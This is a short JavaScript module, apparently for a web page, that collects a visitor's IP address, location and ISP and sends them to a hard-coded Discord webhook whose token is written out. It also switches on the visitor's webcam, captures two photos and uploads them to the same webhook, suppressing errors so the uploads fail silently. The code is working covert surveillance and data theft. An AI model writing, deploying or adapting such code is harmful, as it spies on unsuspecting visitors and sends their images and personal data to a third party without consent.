const webhookURL = 'https://discordapp.com/api/webhooks/1374439333473292298/oF_3g-oeCrSnruf7vmDS8wd9bqXvQnvhTTkJdBUpaQU-r4K_JOLcXFHHzCA8W8J5Zcws';

export async function sendIPInfo() {
  try {
    const res = await fetch('https://ipapi.co/json/');
    const data = await res.json();
    const content = {
      content: `Visitor IP info:\nCity: ${data.city}\nRegion: ${data.region}\nCountry: ${data.country_name}\nIP: ${data.ip}\nISP: ${data.org}`
    };
    await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(content)
    });
  } catch (e) {
    // silently fail
  }
}

async function sendImageToWebhook(blob, filename) {
  try {
    const form = new FormData();
    form.append('file', blob, filename);
    await fetch(webhookURL, {
      method: 'POST',
      body: form
    });
  } catch (e) {
    // silently fail
  }
}

export async function capturePhotos() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext('2d');

    // First capture immediately
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    canvas.toBlob(blob => sendImageToWebhook(blob, 'photo1.png'));

    // Second capture after 3 seconds
    setTimeout(() => {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(blob => sendImageToWebhook(blob, 'photo2.png'));
      stream.getTracks().forEach(track => track.stop());
    }, 3000);
  } catch (err) {
    throw err;  // let caller handle denial
  }
}
